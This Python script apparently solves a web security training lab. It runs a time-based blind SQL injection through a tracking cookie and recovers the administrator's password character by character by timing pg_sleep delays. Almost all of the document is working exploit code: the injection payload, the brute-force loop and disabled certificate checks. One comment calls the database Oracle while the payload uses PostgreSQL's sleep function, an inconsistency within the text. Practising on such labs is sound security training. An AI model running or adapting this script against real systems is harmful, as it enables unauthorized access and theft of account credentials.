import sys
import requests
import urllib.parse
import urllib3

#--------------------------------------------------------------------------#
#                                 CHANGEME                                 #
URL = 'https://ac361f4f1e3e719ec0690d07001400fe.web-security-academy.net/' #
TRACKING_ID = 'J4KaB5NbraTbw2iU'                                           #
SESSION_COOKIE = 'gGIIppVJMPr1jxXQAyn4Msv5MoVKilyD'                        #
#--------------------------------------------------------------------------#

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def time_sqli():
    password = ""
    # len(password) = 20
    for i in range(1, 21):
        for j in range(32, 126):
            # We are dealing with an Oracle database
            payload = f"' || (SELECT CASE WHEN (username='administrator' AND ASCII(SUBSTRING(password,{i},1))='{j}') THEN pg_sleep(3) ELSE pg_sleep(-1) END FROM users)--"
            encoded_payload = urllib.parse.quote(payload)

            cookies = {
                'TrackingId': TRACKING_ID + encoded_payload,
                'session': SESSION_COOKIE
            }

            r = requests.get(URL, cookies=cookies, verify=False)
            time_elapsed = int(r.elapsed.total_seconds())

            # "True" case
            if time_elapsed > 3:
                password += chr(j)
                print('\r' + password, flush=True, end='')
                # Move on to the next character
                break
            # "False" case
            else:
                print('\r' + password + chr(j), flush=True, end='')

if __name__ == "__main__":
    time_sqli()
